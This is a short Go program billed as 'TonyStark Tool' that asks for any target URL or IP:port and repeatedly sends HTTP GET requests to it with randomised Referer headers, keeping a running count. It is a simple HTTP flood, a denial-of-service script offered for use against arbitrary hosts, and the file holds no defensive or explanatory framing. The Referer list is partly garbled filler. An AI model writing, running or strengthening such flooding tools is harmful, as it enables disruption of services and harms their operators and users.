package main

import (
    "fmt"
    "math/rand"
    "net/http"
    "os"
    "os/signal"
    "strings"
    "sync/atomic"
    "syscall"
    "time"
)

var (
    headersReferers []string = []string{
        "nahid",
        "nahid.py",
        "encrypted",
        "TonyStark-cython.311.os",
        "pass -data",
        "http://www.google.ru/?hl=ru&q=",
        "net bug biggie-TonyStark + print(data)",
    }
    requestsSent uint64 = 0
)

const __version__ = "1.0.5"

func getRandomHeader() string {
    return headersReferers[rand.Intn(len(headersReferers))]
}

func sendRequest(target string) {
    client := &http.Client{}
    req, err := http.NewRequest("GET", target, nil)
    if err != nil {
        fmt.Println("Request creation error:", err)
        return
    }

    req.Header.Set("Referer", getRandomHeader())

    _, err = client.Do(req)
    if err != nil {
        fmt.Println("Request error:", err)
        return
    }

    atomic.AddUint64(&requestsSent, 1)
}

func main() {
    rand.Seed(time.Now().UnixNano())

    fmt.Println("TonyStark Tool v", __version__)
    fmt.Println("Number of headers/referers:", len(headersReferers))

    // Handle Ctrl+C gracefully
    sigs := make(chan os.Signal, 1)
    signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
    go func() {
        <-sigs
        fmt.Println("\nExiting... Total requests sent:", atomic.LoadUint64(&requestsSent))
        os.Exit(0)
    }()

    var target string
    fmt.Print("Enter target (URL or IP:Port): ")
    fmt.Scanln(&target)

    // Automatically add http:// if not present
    if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
        target = "http://" + target
    }

    fmt.Println("Sending requests to:", target)

    ticker := time.NewTicker(1 * time.Second)
    for range ticker.C {
        go sendRequest(target)
        fmt.Println("Requests sent so far:", atomic.LoadUint64(&requestsSent))
    }
}
